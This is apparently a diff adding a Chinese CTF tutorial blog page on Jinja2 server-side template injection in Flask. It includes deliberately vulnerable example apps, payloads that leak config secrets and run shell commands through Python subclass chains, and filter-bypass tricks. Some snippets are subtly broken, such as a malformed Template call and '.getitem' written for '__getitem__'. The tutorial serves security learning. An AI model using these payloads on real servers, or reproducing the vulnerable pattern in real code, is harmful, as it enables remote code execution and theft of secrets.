@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="写在前面 CTF web还是需要大量的沉淀的。我在最近的CTF中主打一个眼高手低（bushi）完全就是凭着以前开发的基础做题。对于很多漏洞类型缺乏掌握（或者可以说是只听说过或在wp里看过）。所以想来想去还是好好回去学一下常见的漏洞，把成因，漏洞特征，利用，常见防护及绕过都搞懂，顺便做做例题。于是还是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF web漏洞合集 Python篇（1）python中的SSTI">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="写在前面 CTF web还是需要大量的沉淀的。我在最近的CTF中主打一个眼高手低（bushi）完全就是凭着以前开发的基础做题。对于很多漏洞类型缺乏掌握（或者可以说是只听说过或在wp里看过）。所以想来想去还是好好回去学一下常见的漏洞，把成因，漏洞特征，利用，常见防护及绕过都搞懂，顺便做做例题。于是还是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18442823/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18442823/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18442823/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18442823/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18442823/05.png">
+<meta property="article:published_time" content="2024-10-01T05:42:00.000Z">
+<meta property="article:modified_time" content="2024-10-01T05:42:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18442823/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTF web漏洞合集 Python篇（1）python中的SSTI</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-10-03-ctf-web-python2python/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-09-24-patriot-ctf-2024-misc-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&text=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&is_video=false&description=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF web漏洞合集 Python篇（1）python中的SSTI&body=Check out this article: https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&title=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&name=CTF web漏洞合集 Python篇（1）python中的SSTI&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-10-01-ctf-web-python1pythonssti/&t=CTF web漏洞合集 Python篇（1）python中的SSTI"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E2%80%93-python-SSTI"><span class="toc-number">1.</span> <span class="toc-text">python模板注入 – python SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%88%90%E5%9B%A0"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E7%89%B9%E5%BE%81"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">1.3.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">1.3.2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E4%B8%87%E8%83%BD%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1.使用万能的对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%AE%9A%E4%B9%89%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2.直接使用代码中定义的对象</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%B8%B8%E8%A7%81%E9%98%B2%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 常见防护及绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#request-args%E9%80%83%E9%80%B8"><span class="toc-number">1.4.1.</span> <span class="toc-text">request.args逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF"><span class="toc-number">1.4.2.</span> <span class="toc-text">{%%} 代替 {{}}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getitem%E4%BB%A3%E6%9B%BF"><span class="toc-number">1.4.3.</span> <span class="toc-text">.getitem代替[]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF-1"><span class="toc-number">1.4.4.</span> <span class="toc-text">[]代替.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%90%88%E5%B9%B6"><span class="toc-number">1.4.5.</span> <span class="toc-text">字符串合并</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chr%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.6.</span> <span class="toc-text">chr绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E4%BE%8B%E9%A2%98"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 例题</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CTF web漏洞合集 Python篇（1）python中的SSTI
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-01T05:42:00.000Z" class="dt-published" itemprop="datePublished">2024-10-01</time>
+        
+        (Updated: <time datetime="2024-10-01T05:42:00.000Z" class="dt-updated" itemprop="dateModified">2024-10-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>写在前面</strong></p>
+<p>CTF web还是需要大量的沉淀的。我在最近的CTF中主打一个眼高手低（bushi）完全就是凭着以前开发的基础做题。对于很多漏洞类型缺乏掌握（或者可以说是只听说过或在wp里看过）。所以想来想去还是好好回去学一下常见的漏洞，把成因，漏洞特征，利用，常见防护及绕过都搞懂，顺便做做例题。于是还是把这些学习的新的和成果写下来吧，就当是分享，也是给我自己一个交代。就从我最熟悉的python开始写起吧，后续再慢慢学js，java甚至是go的后端审计;)</p>
+<p>少就是多，慢就是快</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1">python模板注入 – python SSTI</a><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.1">0x01 成因</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.2">0x02 漏洞特征</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.3">0x03 利用</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.4">0x04 常见防护及绕过</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.5">0x05 例题</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="python模板注入-–-python-SSTI"><a href="#python模板注入-–-python-SSTI" class="headerlink" title="python模板注入 – python SSTI"></a>python模板注入 – python SSTI</h1><p>只写jinja2的SSTI吧，毕竟现在CTF的python模板很少见到别的了</p>
+<h2 id="0x01-成因"><a href="#0x01-成因" class="headerlink" title="0x01 成因"></a>0x01 成因</h2><p>我们来看一段代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template_string</span><br><span class="line">from jinja2 import Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def main():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;)</span><br><span class="line">    t = &#x27;&#x27;&#x27;  </span><br><span class="line">        &lt;html&gt;</span><br><span class="line">            &lt;h1&gt;Hello my dear %s&lt;/h1&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &#x27;&#x27;&#x27; % (name)</span><br><span class="line">    return render_template_string(t)</span><br></pre></td></tr></table></figure>
+
+<p>以及</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template_string</span><br><span class="line">from jinja2 import Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def main():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;)</span><br><span class="line">    t = Template&#x27;&#x27;&#x27;  </span><br><span class="line">        &lt;html&gt;</span><br><span class="line">            &lt;h1&gt;Hello my dear %s&lt;/h1&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &#x27;&#x27;&#x27; % (name)</span><br><span class="line">    return t.render()</span><br></pre></td></tr></table></figure>
+
+<p>当传入name为正常的字符串，比如LamentXU，就会返回Hello my dear LamentXU。一切多么美好（bushi）</p>
+<p>但是，如果我们输入{{7*7}}就会返回49</p>
+<p>这是因为，用户的输入被直接拼接到渲染Template里去了，<strong>而在Template里，你是可以用{{}}或{%%}执行python代码的！</strong> 然而，以下代码就不会出现问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def main():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;)</span><br><span class="line">    return render_template(&#x27;index.html&#x27;, name=name)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>
+
+<p>由此，我们可以得出漏洞特征，也就是什么时候会出现SSTI漏洞</p>
+<h2 id="0x02-漏洞特征"><a href="#0x02-漏洞特征" class="headerlink" title="0x02 漏洞特征"></a>0x02 漏洞特征</h2><p><strong>直接将用户输入通过字符串拼接合并到模板里渲染的python jinja2后端容易出现由SSTI引起的RCE</strong></p>
+<p>当然，其他python模板也大差不差，现学现卖就行。然而其他语言的模板可能会有较大差距，不过核心思想不变，都是由服务器无过滤无检查地直接将用户的输出拼接到模板中导致的。</p>
+<p>漏洞必须带有以下特征：</p>
+<ul>
+<li>存在<code>render_template</code>或<code>render_template_string</code>函数</li>
+<li>存在直接将用户可控的输入使用字符串拼接的方法传入上述函数中的行为</li>
+<li>没有过度严格的过滤（如过滤单个大括号符<code>}</code>，<code>{</code>或存在于沙箱环境中），然而，具体情况具体分析，有些题目内是可以绕过这些过滤的</li>
+</ul>
+<p><strong>POC: {{7*7}} 如果返回49就确诊SSTI了</strong></p>
+<h2 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h2><p>确诊SSTI后，我们主要有两个思路：</p>
+<ul>
+<li>XSS</li>
+<li>RCE</li>
+</ul>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS这个比较好理解，毕竟是直接拼接用户输入到渲染里。跟一般的xss题目差距不是很大，不展开细讲。这里直接给个例子。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template_string</span><br><span class="line">from jinja2 import Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def main():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;)</span><br><span class="line">    t = &#x27;&#x27;&#x27;  </span><br><span class="line">        &lt;html&gt;</span><br><span class="line">            &lt;h1&gt;Hello my dear %s&lt;/h1&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &#x27;&#x27;&#x27; % (name)</span><br><span class="line">    return render_template_string(t)</span><br></pre></td></tr></table></figure>
+
+<p>就这一段漏洞代码来说，如果给name传参<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>将会成功xss</p>
+<p>这里我更喜欢用一个自己定义的词汇来描述：“上级漏洞”。可以说：有SSTI的地方一定有XSS，但有XSS的地方不一定有SSTI（我喜欢把SSTI叫成XSS的上级）。所以，尤其在黑盒审计中，当发现一处存在XSS而又没什么利用点时（尤其是反射型的XSS）优先考虑SSTI</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>我们都知道，在确诊了SSTI漏洞后可以有一个等效于python中eval()的sink点，那么就可以把eval的那一套搬过来。问题是，没有服务器会蠢到帮你导入os，sys这种危险库，还得靠你自己导入。</p>
+<p>首先，如果你的目标是flask app的配置信息（如SECRET_KEY）或者服务器的环境变量，那么恭喜你可以直接出了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;		# 获取config，包含secret_key</span><br><span class="line">&#123;&#123;request.environ&#125;&#125;	# 获取环境信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18442823/01.png"></p>
+<p>如果你的目标是读取flag文件的话，那么我们的最终目标是找到并导入os库，使用system或者popen这种危险函数来读取。当然，你也可以导入pickle库来反弹shell（见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18243707">R3CTF jinjaclub</a>）。我们的思路也很明显：</p>
+<ul>
+<li>使用万能的对象（比如字符串对象’’）-&gt; 子类 -&gt; 基类 -&gt; 危险类的危险函数（大多数情况）</li>
+<li>直接使用代码中定义的对象（包括已经导入的库）所包含的危险子类中的危险函数（比如说R3CTF那道题）</li>
+</ul>
+<h4 id="1-使用万能的对象"><a href="#1-使用万能的对象" class="headerlink" title="1.使用万能的对象"></a>1.使用万能的对象</h4><p>这里说是“万能的对象”，其实大多数情况下，最好用最经典的还是字符串对象’’，当然[]这些对象也是可以的</p>
+<p>python中每个对象都有个属性<code>__class__</code>，用于返回该对象所属的类。而我们要做的，就是<strong>获取到object基类</strong>（可以理解为世界的开端（bushi）是一切类的父类）</p>
+<p><strong>使用<code>&#39;&#39;.__class__</code>我们就完成了第一步，即，获取到一个字符串对象</strong></p>
+<p><img src="/images/migrated/18442823/02.png"></p>
+<p>当然[]也可以（{},()也行）</p>
+<p><img src="/images/migrated/18442823/03.png"></p>
+<p>还有：</p>
+<p><code>__bases__</code>：以元组的形式返回一个类所直接继承的类。</p>
+<p><code>__base__</code>：以字符串形式返回一个类所直接继承的类。</p>
+<p><code>__mro__</code>：返回解析方法调用的顺序。</p>
+<p>这三个属于获取基类的办法。获取到object基类之后，因为这个基类的子类是这个python程序目前的所有类，所以可以直接找到我们要的os（是基类的一个子类）</p>
+<p><strong>使用<code>&quot;&quot;.__class__.__bases__</code>或<code>&quot;&quot;.__class__.__mro__[1]</code>或<code>&quot;&quot;.__class__.__base__</code>我们就完成了第二步，即，获取到了object基类，也就是世界的开端（bushi）</strong></p>
+<p>一个纯净的python3.9中继承了object基类的类如下：</p>
+<p><img src="/images/migrated/18442823/04.png"></p>
+<p><code>__subclasses__()</code>：获取类的所有子类。</p>
+<p><code>__init__</code>：所有自带带类都包含init方法，便于利用他当跳板来调用globals。</p>
+<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
+<p>我们要做的，是找到使用os的内置类。那这可多了，这里可以fuzz出（由python环境改变而改变）如果没有的话，也可以找一些可以读取文件的内置类，那么_warnings.catch_warnings_类可就成重灾区了（有很多其他的）</p>
+<p>我们发现object基类的__subclasses__()中**&lt;type ‘warnings.catch_warnings’&gt;**的索引值为138（随环境改变而改变），导入他后直接导入os并RCE即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[138].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>当然，你也可以找到其他调用了os的内置类，利用<code>__init__</code>和<code>function.__globals__</code>来调用内置类中os类的方法，如subprocess.popen：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有用的python内置类有很多，这里贴一个佬的脚本，可以直接把subclass出来的东西放data里帮你检测有用的类的索引，也是我做题经常用的脚本（出自 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/tuzkizki/p/15394415.html#%E6%9E%84%E9%80%A0payload">https://www.cnblogs.com/tuzkizki/p/15394415.html#构造payload</a> ）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 将查找到的父类列表替换到data中</span><br><span class="line">data = r&#x27;&#x27;&#x27;</span><br><span class="line">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 在这里添加可以利用的类，下面会介绍这些类的利用方法</span><br><span class="line">userful_class = [&#x27;linecache&#x27;, &#x27;os._wrap_close&#x27;, &#x27;subprocess.Popen&#x27;, &#x27;warnings.catch_warnings&#x27;, &#x27;_frozen_importlib._ModuleLock&#x27;, &#x27;_frozen_importlib._DummyModuleLock&#x27;, &#x27;_frozen_importlib._ModuleLockManager&#x27;, &#x27;_frozen_importlib.ModuleSpec&#x27;]</span><br><span class="line"></span><br><span class="line">pattern = re.compile(r&quot;&#x27;(.*?)&#x27;&quot;)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line">for c in class_list:</span><br><span class="line">    for i in userful_class:</span><br><span class="line">        if i in c:</span><br><span class="line">            print(str(class_list.index(c)) + &quot;: &quot; + c)</span><br></pre></td></tr></table></figure>
+
+<p>做题流程也很明确了：确定好要用SSTI打RCE之后用burp（payload：<code>&quot;&quot;.__class__.__mro__[1].__subclasses__()</code>）fuzz服务器找os或者file，然后读取文件或RCE</p>
+<p><strong>总结一下就是：先找object基类，然后subclasses出所有的类（就应该是一大坨玩意）然后放上面那个脚本里跑索引。找到能用的类之后去网上找这个类对应的payload打就完了（上面展示了两个）</strong></p>
+<h4 id="2-直接使用代码中定义的对象"><a href="#2-直接使用代码中定义的对象" class="headerlink" title="2.直接使用代码中定义的对象"></a>2.直接使用代码中定义的对象</h4><p>可以先看一下R3CTF 中jinjaclub的wp（上文里有链接）。方便你更好理解。</p>
+<p>这种情况比较稀有，在沙箱环境内，你无法找到object基类。但是你仍然可以使用程序空间内已经定义好的对象。这里建议在你的IDE里开断点调试。看看程序内的对象里有没有引用到什么类，而这些类有没有引用到一些危险类或有没有危险函数。这需要一些osint的内容（你要去看这些引用到的类的开发手册，等等）</p>
+<p>在R3CTF的例子中User类由于继承了pydantic的BaseModel，而BaseModel中有一个parse_raw函数里有一个proto参数和allow_pickle参数可以解析pickle。可以上传恶意pickle文件弹shell打RCE。</p>
+<p>过程也很明确。F5在请求函数第一行处断点，ctrl+B对着可以引用的对象一个一个瞪就能瞪出来。</p>
+<p>下图为R3CTF那个题的调试截图</p>
+<p><img src="/images/migrated/18442823/05.png"></p>
+<p>对着User类看就完了</p>
+<h2 id="0x04-常见防护及绕过"><a href="#0x04-常见防护及绕过" class="headerlink" title="0x04 常见防护及绕过"></a>0x04 常见防护及绕过</h2><h3 id="request-args逃逸"><a href="#request-args逃逸" class="headerlink" title="request.args逃逸"></a>request.args逃逸</h3><p>如果题目中没有过滤request，则可以将一些含有敏感字符的位置用get传，再在SSTI中用request.args.arg1逃逸到get参数里去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=__globals__&amp;b=os&amp;c=cat /flag&amp;sentence=%print (lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="代替"><a href="#代替" class="headerlink" title="{%%} 代替 {{}}"></a><code>{%%}</code> 代替 <code>{{}}</code></h3><p>{%%}在jinja2里与{{}}充当相似的角色，都可以来SSTI（bushi）</p>
+<h3 id="getitem代替"><a href="#getitem代替" class="headerlink" title=".getitem代替[]"></a>.getitem代替[]</h3><p>python中[]与.是相同的</p>
+<p>所以如果过滤了[]的话可以用.getitem</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tuple[0] == tuple.getitem(0)</span><br></pre></td></tr></table></figure>
+
+<p>python特性解决</p>
+<h3 id="代替-1"><a href="#代替-1" class="headerlink" title="[]代替."></a>[]代替.</h3><p>python里对象的特性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.b == a[&#x27;b&#x27;]</span><br></pre></td></tr></table></figure>
+
